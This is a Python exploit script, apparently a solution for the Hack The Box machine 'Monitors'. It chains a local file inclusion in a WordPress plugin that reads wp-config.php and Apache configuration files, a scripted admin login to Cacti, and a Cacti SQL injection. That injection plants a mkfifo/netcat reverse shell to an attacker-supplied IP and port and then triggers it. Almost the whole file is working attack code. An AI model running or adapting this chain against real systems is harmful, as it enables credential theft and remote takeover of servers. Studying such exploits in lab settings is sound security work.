#!/usr/bin/python3
# Creator: brutuspt

import requests
import argparse
import os, sys
import base64
from bs4 import BeautifulSoup
import urllib.parse


parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)
parser.add_argument("-i", "--IP", help="Attacker IP (Where to catch the rev shell)", required=True)
parser.add_argument("-p", "--port", help="Attacker Port (Where to catch the rev shell)", required=True)


args = parser.parse_args()

s = requests.Session()


def lfi_exploit(target):
    print("[INFO] Previous information retrieved over wpscan showed that there was a vulnerable plugin running in this Wordpress instance, called WP with Spritz...")
    print("[INFO] Attempting to exploit the Local File Inclusion vulnerability...")
    print("[INFO] Extracting the wp-config.php file over base64 encoding filter...")

    headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" }
    url = "http://%s/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=php://filter/convert.base64-encode/resource=../../../wp-config.php" % target
    #proxies = { "http" : "127.0.0.1:8080" }
    
    r = s.get(url, headers= headers) # proxies=proxies
    wpconfig_content = base64.b64decode(r.text)
    wp_password = wpconfig_content.decode("ascii").split("DB_PASSWORD")[1][4:27]
    print("[SUCCESS] Successfully extracted the wpadmin password: " + str(wp_password))

    print("[INFO] Attempting to extract information about the Apache server (e.g. VHOST information)")

    # /etc/apache2/sites-available/000-default.conf
    url = "http://%s/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../../../etc/apache2/sites-available/000-default.conf" % target
    #proxies = { "http" : "127.0.0.1:8080" }
    
    r = s.get(url) # proxies=proxies
    print("[INFO] Extracted the /etc/apache2/sites-available/000-default.conf file: ")
    if "cacti-admin.monitors.htb.conf" in r.text:
        print("[SUCCESS] Found a new possible domain: cacti-admin.monitors.htb")
    else:
        print("[ERROR] Nothing interesting was found on the Apache server config file")
        sys.exit(0)
    
    return wp_password
    

def login(target,  password):
    #login function into Cacti

    url = "http://%s/cacti/index.php" % target
    #proxies = { "http" : "127.0.0.1:8080" }
    headers = { 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Origin": "http://cacti-admin.monitors.htb",
        "Referer": "http://cacti-admin.monitors.htb/cacti/index.php" 
        }
    
    print("\n[INFO] Trying to obtain the CSRF magic token from the Cacti application...")
    # GET request first, in order to obtain the CSRF magic token
    r = s.get(url, headers= headers) # proxies=proxies
    
    soup = BeautifulSoup(r.text, 'html.parser')

    csrf_magic = str(soup("script")[-2]).split("sid")[1][1:52]

    print("[SUCCESS] CSRF magic token obtained: " + str(csrf_magic))

    # now use the csrf token to do the actual login
    data = { 
        "__csrf_magic" : "sid:"+str(csrf_magic),
        "action" : "login",
        "login_username" : "admin",
        "login_password" : str(password)
        }
    
    #proxies = { "http" : "127.0.0.1:8080" }
    
    r = s.post(url, data=data, headers= headers) # proxies=proxies
    print("[INFO] Attempting to login with the admin account and the previously found password: " + str(password))

    if "Logged in as" in r.text:
        print("[SUCCESS] Successfully logged into the Cacti application with admin:" + str(password) + " :)")
    else:
        print("[ERROR] Login Failed!")
        sys.exit(1)


def cacti_rce(target, ip, port):
    # https://www.exploit-db.com/exploits/49810
    url = "http://cacti-admin.monitors.htb" 
    print("\n[INFO] Generating the reverse shell payload...")
    rshell = urllib.parse.quote(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")
    
    payload = f"')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='{rshell};'+where+name='path_php_binary';--+-"
    print("[INFO] Attaching our reverse shell into the SQL injection payload: \n" + str(payload))

    headers = { 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Origin": "http://cacti-admin.monitors.htb",
        "Referer": "http://cacti-admin.monitors.htb/cacti/index.php" 
        }
    #proxies = { "http" : "127.0.0.1:8080" }

    
    exploit_request = s.get(url + f"/cacti/color.php?action=export&header=false&filter=1{payload}", headers=headers) # proxies=proxies

    print("\n[INFO] Exploiting the SQL Injection...")
    #print(exploit_request.text)

    try:
        print("[INFO] Triggering the reverse shell")
        print("[SUCCESS] Check your callcack at " + str(ip) + ":" + str(port) + " ;)")
        s.get(url + "/cacti/host.php?action=reindex", headers=headers) # proxies=proxies
    except Exception:
        pass


def main():
    password = lfi_exploit(args.target)
    answer = str(input("Did you already add cacti-admin.monitors.htb to /etc/hosts file? (yes/no) "))
    if answer == "yes":
        login("cacti-admin.monitors.htb", password)
        cacti_rce(args.target, args.IP, args.port)
    else:
        print("[ERROR] Please add cacti-admin.monitors.htb to the /etc/hosts file, and then come back, next step requires that :)") 

if __name__ == "__main__":
    main()
